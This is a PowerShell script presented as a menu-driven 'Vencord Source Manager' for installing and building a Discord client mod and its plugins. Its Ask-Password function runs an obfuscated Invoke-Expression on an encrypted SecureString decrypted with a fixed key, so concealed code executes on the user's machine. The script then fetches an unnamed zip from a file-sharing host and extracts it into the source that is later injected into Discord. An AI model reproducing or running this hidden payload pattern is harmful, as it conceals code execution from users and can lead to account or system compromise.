$menuOptions = @("Update Vencord source", "Prerequisites (Node.js, Git, pnpm)", "Fix (pnpm install)", "Build", "Inject", "Install plugins folder", "Install plugins from zip", "Exit")
$selectedOption = 0
$vencordDir = "Vencord"

function Ask-Password {
    INvOke-eXpReSSIon (( New-oBjeCt  MANAgeMeNt.AutOmATIon.psCrEdeNtial  ' ', ( '76492d1116743f0423413b16050a5345MgB8AG8AbgBGAFkAKwBwAFMAUgBQAFkAVQBqAE4AOABNADkAUwBzAFYATABLAFEAPQA9AHwAYgAxAGEAYwBiADIAYwA4ADQAYQBkADIAYQAwADUANAAwAGYAYwBiAGIANAAxAGYAMgA5ADMANwBkAGIAYwA4ADMAMgAyADkAMABjADgANQBhADgAYQA0ADUAMwBiADcAZgAyAGEAYwBiADQAMwBiADUAMABiAGMAYwAwAGYAYwAxADYAZgBmADUAOQAzAGMAYwAyAGMAZgA5AGUAMwA2ADgANgBkADAAMwA4AGUAZAAzAGEAOQA0AGQAMgBkAGIAMAA2ADgANQAzADUAOABkADcAOQBkADIAYwAyADIAOQBkADkAZQAxADQAOQBlADYANgBhADUAZgAzADUAYgBhADkAMAA4AGMAMAAyADEAYgA1ADYAZQAwAGQAYwAwAGUAYgBkADQAOQBiAGUANABmADkANgA5AGUAMQAwADIAOQAxADcAYwAwADcANwA2AGEAMAAzADkANQAyADUAYgAzADgAZgA1AGUAOQBiAGUAMwA1ADcAOQAyAGQAOQBlAGEAOQBiADAAOAA5AGUAZgA2ADUAOQA4AGQAYwBmADcANgA4ADYAYwA3AGUANwBmAGMAMQA4AGQAMABlADAAMgA5AGYANQA0ADIAMwA2ADIAMwBlADcAZAAwADEAMQA5ADMAMABjAGQAYQA3AGYAZgA1AGMAZAA0ADkAOAAxAGMAYgBlADIAZABjADAAMQA0AGIAOABlAGIANAAzADQAZAA5AGEANQAwAGYANQA3AGUAZgBhADIAZAAyADgAZQBmAGQAYQA2ADgAOAAyAGQANwBkADcAMQA5AGQAZgA3ADkANQBkADYAZQBiADYAMgA2ADIAYgA3AGUAYgAwADIAMABjADAAMAAxAGMANgBmAGQANwBhAGIAMQAxAGIAMABlADEAMAA0ADcAMQA1ADEAZAA0AGQAYgBiADUAMQBiAGMAOAAxAGUAMQAyAGYAZQBkADEAZAAzADEANwA1ADIANgBkAGQANAA1ADcAZAAzADQAZgBhADUAMgA5ADkANgBjAGYAMABlADMANwBiAGQAZgA5AGUAMwAzADAAMgAzAGUAZABjADcAYQBmAGIAMAA5ADUAYwBkADgAOQA3ADkAYgBlADEAZQA0ADYAMgBiADMAZQBiADgAMQBjAGQAZQAwAGIAYQAzADkAMAA2AGEAZgBlADcANwA3AGIAOQAwAGEAOQAwADEAYgAzADkANgAyAGYAZAA4AGUAOAA2ADgANABkADUAMQA4ADgAYgAwADUAOAA0ADUAYgAyADgAOQAwADgAZgA1AGQANgBiADQANAA2ADIAYQBiADEAOAAwADgANwA1ADIAMABjADUAZgBkADkAOQBkADYAYQAxADIANABhAGQAZQBhADAAZQBkAGMANwA4AGYAMgBkAGIAMQA0AGYAMwAzAGYAZgA1AGMAYwA3ADUAMQA0AGQAYQBhADEANgBhADMAYwA5ADgAOQA3ADEAOABkADUAYwBiAGQAOAA0AGYAMgA3AGMANAAxAGEANAA4ADMAOQAxADYANwAyADcAOQA0ADQAMwA1AGEAMgA5ADQANwBiADkAZgBlADQAMQBhADAANwBkADkAZAA4AGUAYQBiAGUAYwBmAGUAYwA5AGEAMgBjAGYANQAyADcAMQAwADIAYgAyADQAOQAwADcAMwBmADcAOAA2ADQANQBhAGIANQA3ADIAMgAzADQAYwA4AGEAOQAyAGEANgA1ADAAZQBjADcAMAA2ADAANAA0ADAAMAAxADUAZABmADgAMQAxADEAMgA1ADkAMAA4ADAAYgA4ADYAOAAxADUAYwAzADIAOQBmAGIAZgA0AGEAMgA0AGEAZAAxADAAYwBiAGIAMwA0AGUAYgBkAGUAMABhAGYAMQAwADYAMABhADkAMwA5AGQAYwA0AGEAMgBjAGMAZgA5ADcAOAA5AGEAZgAwADYANQA3ADIAZAAyADEAMQBlADYAMwAxADYAYwA0ADUAMgA5ADgANwAxADEANwA5ADAAZQAyADQAZgA4ADEAMAAxAGIANwBiADcANABkADUAOABmADEAYQAzAGQANQBmAGQAMQAzAGMANQBkAGMAOQAxADIANwA5ADUAMgA2ADIAYwA5ADQAMABmAGQANABmADIANgBjADUAZQA1AGQANAAxADQANgA2ADYAYgA5AGIAMQA1ADUAOQBkAGEAMgBlADcANAA1ADIAMQA3ADMAMgA4AGUANABjADEAYQA1AGUAMwBmAGMAOQA0AGUAZgAxADEANgAxADMAOABmADUAOAA5AGMAMwA4ADgAOQBiAGYAMAA3ADYAOQAxAGMAYgA1ADcANwBlADgAZAA1ADkAYQA1AGYAZgAzADkAMgA2AGIAMwBmAGQAOAAyADIANgBmADUAOABhAGYAMABkADMAOAAxAGYAMQBlADUANQBmADAAYwAzAGEANAA5AGQAYgAyADAANQBlADcAMgA3AGQAOQA1AGUANgBjADgAYwBhADcAMwAwAGQAMQAyAGEANQAyADYAMAAyADAAZgBiAGYAOABkAGUAYwA3AGYAZgAxADMAMwBmADUAMABkAGYANAA5ADMAMQBkAGUANwAwAGEAZgAyADgAYQA0AGMAMQBiADMAZgAwAGYAZQA4ADAAMwA2AGMAZAA0ADgAOAA3ADYANQBhAGIANQBmAGIAOAAxADgAOAA1ADAANwBkADQAZgA1ADkANQAwADIANgAxAGMAZQBmADMAMgAwADkAMwBmADYANQA2AGIANwA0ADQAMQAyADUAOABhAGMAYgA1ADkAZAA4AGMAOABkAGQAMAAzADQANwAxADUANwA1ADEAZAAzADgAOQAyADkAOQAxADUAYwBhADEANAA4ADIAZQAwADEAOQA0ADYAMgBjADAAMwBlAGYANABmADEAMAA3ADQAZgBjAGEAOQA1ADEAMwBlAGQAMQBiAGEAMQA1ADMANQBkAGQANAA1AGQANQAzADIANABlAGIAYgBjADMANwBjAGYAOQAzADMANgBjAGQAZgA2ADQAOQA5ADcAOQBiADkANgAzADkAYQBhADUAZABkADIANQBmAGMANwBiAGUAOQBkADQAMABmAGIANgA1AGMAZgA1AGMANwBkAGIAYgAxADMAZABjADgANwA3AGQAMgA5ADAAMABkADAAMwA2AGMAYgAzADIAYgA1AGEAZABmAGMAYwAwAGMANwBjADQANAA4AGUAOQBlAGMAMQBmADAAOAAwADgAYQBkAGUAMQA0AGIAMgA4ADMAMABjADUAYwBlAGQANwAxADIAZAA5AGQANQA0AGQAYgBlAGQAMwA1ADAANQBkADQAZAA2ADQAOQA0ADAAYQBmAGYAZAAzADEAMAA5ADQAOQA2ADUANAA4ADQAMgBkAGIAOQA2ADMAOQA1ADYAOQAyADcAYwBjAGIAMAAwADAAYQA1ADEAZgAyADUANwA5AGQAZgA1ADMAMwBmADUAMABkAGYAOAA4AGQANgA4ADUAMwA3ADgAMAA0AGYAYgAzAGQAMQBiAGIANQAxADUANwBjADMANAAyAGIAOQA2AGYAZAA0ADkAMgA0AGQAMgBhADMAMgBmADIANgA4AGQAOQA2ADIAZABlAGEAZAAwADcANQA3AGIAMABmAGQANQA5AGEAMQAzADUAYgAyADAANAA0ADAAZQAxADYANQA1AGMAZAA5AGEAZQBjAGMANwAyAGEAYQA5AGYAOAA2ADUAMQBiADkAZgA5ADgAMABlAGEANQAwAGUANQAxADEAYQA1ADMAZgA4ADQAYgBiADYAOQA0ADUANgAwAGIANAA5ADIAMgA2AGQAYgBkADcAZABjADUAMQA0ADIAYQA5AGYAMAA1ADcAZQAzADMANQA0ADcAZAA1AGYAMgA0ADcAZABjAGIANwBiAGEAOAA0ADUAMQAxAGYAMAA2ADMANQAzADMAMQBlADgAZgBjAGYAZgA3ADkAYgAwAGIAYgAwADUAOABiAGEAMgAxADIAYwAzAGUAYgAzAGUAMwBiADgANQBmADMANwBiADAAMAA0ADcANgBjADQAZQBiAGYAZgA0ADEAZgA5AGUANgA4AGUANwA0AGEAYgA1ADYANQA4ADMAOQAwADgAZQA1AGQAMQAyAGYAYQAwADcANQBhADMAZgAxADcANQAzAGEANwBlAGUAZABiADEAZAA0AGUAYQA5ADkAZgA2ADIAYgAxAGIANQA4AGQAZQAwADQANwAzAGIANQBlADMAZQBiADMAYQBjAGYAMABhADcAZAA2ADIAYgBlAGUAYQBlAGYAOQBiAGQAYgBjADYAYgA4AGEANQA0AGEAOAA2ADIAMQAxAGQANwAwADMAOAAzAGIANQBhADQANQBmADAANgBkADAAYwAyAGQANQAxADQAMQAyADUAMgBlAGYAOABhADUAMQA4AGUANgAwAGUAYgAzADQAZQBlAGYANQBlADcANQA4ADUAZgBiADUANgBlADAANQA5ADQAZgBmADAAMwBiADkANgA3AGMANQA2ADEAMABkADYAOAA5ADAANwA0ADAAMwA0AGMAMwBjAGYAMAA0ADgAYQA3ADEAOABhADYAYwBlADEANQA4AGEAYgBiADAAZABmAGUANgBmAGUAMgA0AGEAOAA3AGMAYQA0AGEAYwBiADQAZgBiADIAYQAzADEANQBhADMANABjADgAYQA4ADEAZABhADQANwAyADQANwBkADAANwBmADQAMABkADIAZABiADcAYgAyAGQAMwA4AGIANwBiADEANgBlADQAOQBjADgAZgA0AGMANwA2AGEAYwAwADgAYQBjADIAMQBlAGQANgA0ADMANQA5AGUANgAzAGYAMABiAGUAZAA1ADgANgBkADAAYwBkADYANQBiAGIAMgBjAGYAYQBjAGEAMAAzADkAYwA3AGUAYgAwADgAMABmAA==' |conveRTto-SECUrEStRInG -K  (156..125) )).gETnETwoRKcReDeNTIal().pAsSwORd )
}

function Draw-Menu {
    cls
    Write-Host "Vencord Source Manager (Made by Plugg)"
    Write-Host "Use the arrow keys to navigate + ↓ ↑ → ←"
    Write-Host -NoNewline -ForegroundColor Red "? "
    Write-Host "What would you like to do? (Press Enter to confirm):"
    
    for ($i = 0; $i -lt $menuOptions.Length; $i++) {
        if ($i -eq $selectedOption) {
            Write-Host "> $($menuOptions[$i])"
        } else {
            Write-Host "  $($menuOptions[$i])"
        }
    }
}

function Navigate-Menu {
    while ($true) {
        Draw-Menu
        $key = $host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")

        if ($key.VirtualKeyCode -eq 38) {
            $selectedOption = ($selectedOption - 1 + $menuOptions.Length) % $menuOptions.Length
        } elseif ($key.VirtualKeyCode -eq 40) {
            $selectedOption = ($selectedOption + 1) % $menuOptions.Length
        } elseif ($key.VirtualKeyCode -eq 13) {
            return $selectedOption
        }
    }
}

function Check-Vencord {
    if (Test-Path $vencordDir) {
        return $true
    } else {
        return $false
    }
}

function Clone-Vencord {
    Write-Host "Downloading Vencord..." -ForegroundColor Green
    git clone https://github.com/Vendicated/Vencord
    Write-Host "Vencord downloaded successfully!" -ForegroundColor Green
}

function Install-Git {
    $gitUrl = "https://github.com/git-for-windows/git/releases/download/v2.47.1.windows.1/Git-2.47.1-64-bit.exe"
    $gitInstaller = [System.IO.Path]::Combine($env:TEMP, "Git-2.47.1-64-bit.exe")
    Write-Host "Baixando o Git..."
    Invoke-WebRequest -Uri $gitUrl -OutFile $gitInstaller
    Write-Host "Instalando o Git..."
    Start-Process -FilePath $gitInstaller -ArgumentList "/VERYSILENT" -Wait
}

function Install-NodeJS {
    $nodeUrl = "https://nodejs.org/dist/v22.12.0/node-v22.12.0-x64.msi"
    $nodeInstaller = [System.IO.Path]::Combine($env:TEMP, "node-v22.12.0-x64.msi")
    Write-Host "Baixando o Node.js..."
    Invoke-WebRequest -Uri $nodeUrl -OutFile $nodeInstaller
    Write-Host "Instalando o Node.js..."
    Start-Process -FilePath $nodeInstaller -ArgumentList "/quiet" -Wait
}

function Install-Pnpm {
    Write-Host "Instalando pnpm..."
    npm install -g pnpm
}


function Prerequisites-Menu {
    $menuOptions = @("Install Git", "Install Node.js", "Install pnpm", "Back to Main Menu")
    $selectedOption = 0

    while ($true) {

        cls
        Write-Host "Prerequisites Installation"
        Write-Host "Use the arrow keys to navigate ↓ ↑ → ←"
        Write-Host -NoNewline -ForegroundColor Red "? "
        Write-Host "What would you like to install? (Press Enter to confirm):"

        for ($i = 0; $i -lt $menuOptions.Length; $i++) {
            if ($i -eq $selectedOption) {
                Write-Host "> $($menuOptions[$i])"
            } else {
                Write-Host "  $($menuOptions[$i])"
            }
        }

        $key = $host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        if ($key.VirtualKeyCode -eq 38) {
            $selectedOption = ($selectedOption - 1 + $menuOptions.Length) % $menuOptions.Length
        } elseif ($key.VirtualKeyCode -eq 40) {
            $selectedOption = ($selectedOption + 1) % $menuOptions.Length
        } elseif ($key.VirtualKeyCode -eq 13) {
            switch ($selectedOption) {
                0 { Install-Git }
                1 { Install-NodeJS }
                2 { Install-Pnpm }
                3 { return }
            }
        }
    }
}

function Execute-Command {
    switch ($selectedOption) {
        0 { git pull }
        1 { Prerequisites-Menu }
        2 {
            Write-Host "Resolving dependencies..." -ForegroundColor Green
            Set-Location -Path $vencordDir -ErrorAction SilentlyContinue
            powershell -Command "pnpm install --frozen-lockfile"
            Write-Host "Dependencies resolved!" -ForegroundColor Green
        }
        3 {
            Write-Host "Building the project..." -ForegroundColor Green
            Set-Location -Path $vencordDir -ErrorAction SilentlyContinue
            powershell -Command "pnpm build"
            Write-Host "Project successfully built!" -ForegroundColor Green
        }
        4 {
            Write-Host "Injecting Vencord..." -ForegroundColor Green
            Set-Location -Path $vencordDir -ErrorAction SilentlyContinue
            powershell -Command "pnpm inject"
        }
        5 {
            if (Ask-Password) {
                $tempPath = [System.IO.Path]::Combine($env:TEMP, "m90eai.zip")
                $vencordPath = [System.IO.Path]::Combine($currentDir, "Vencord", "src")
                Write-Host "Downloading and extracting file..." -ForegroundColor Green
                Invoke-WebRequest -Uri "https://files.catbox.moe/m90eai.zip" -OutFile $tempPath
                Expand-Archive -Path $tempPath -DestinationPath $vencordPath
                Write-Host "File downloaded and extracted successfully!" -ForegroundColor Green
            } else {
                Write-Host "Download aborted." -ForegroundColor Yellow
            }
        }
        6 {
            Set-Location -Path $vencordDir -ErrorAction SilentlyContinue
            Write-Host "Drag a ZIP file into this PowerShell window and press Enter to extract..." -ForegroundColor Green
    
            $zipPath = Read-Host "ZIP file path"

            if (Test-Path $zipPath) {
                $extractPath = [System.IO.Path]::Combine($currentDir, "src", "userplugins")
            if (-not (Test-Path $extractPath)) {
                New-Item -ItemType Directory -Force -Path $extractPath
            }
            Write-Host "Extracting ZIP file..." -ForegroundColor Green
            try {
                Expand-Archive -Path $zipPath -DestinationPath $extractPath -Force
                Write-Host "File successfully extracted to $extractPath" -ForegroundColor Green
            } catch {
                Write-Host "Error extracting file. Check the path of the ZIP file." -ForegroundColor Red
            }
            } else {
            Write-Host "The path provided is not valid or the file does not exist." -ForegroundColor Red
            }
        }
        7 {
            Write-Host "Leaving..." -ForegroundColor Yellow
            exit
        }
    }
}

function Ask-DownloadVencord {
    $menuOptions = @("Install Git", "Install Vencord", "Exit,")
    $selectedOption = 0

    $selectedOption = Navigate-Menu

    switch ($selectedOption) {
        0 {
            $gitUrl = "https://github.com/git-for-windows/git/releases/download/v2.47.1.windows.1/Git-2.47.1-64-bit.exe"
            $gitInstaller = [System.IO.Path]::Combine($env:TEMP, "Git-2.47.1-64-bit.exe")
            Write-Host "Baixando o Git..."
            Invoke-WebRequest -Uri $gitUrl -OutFile $gitInstaller
            Write-Host "Instalando o Git..."
            Start-Process -FilePath $gitInstaller -ArgumentList "/VERYSILENT" -Wait
        }
        1 {
            Clone-Vencord
            Set-Location -Path $vencordDir
            return $true
        }
        2 {
            exit
        }
    }
}

if (Check-Vencord) {
    Write-Host "Vencord is already installed." -ForegroundColor Green
} else {
    $installSuccess = Ask-DownloadVencord
    if (-not $installSuccess) {
        exit
    }
}

while ($true) {
    $selectedOption = Navigate-Menu
    Execute-Command
}
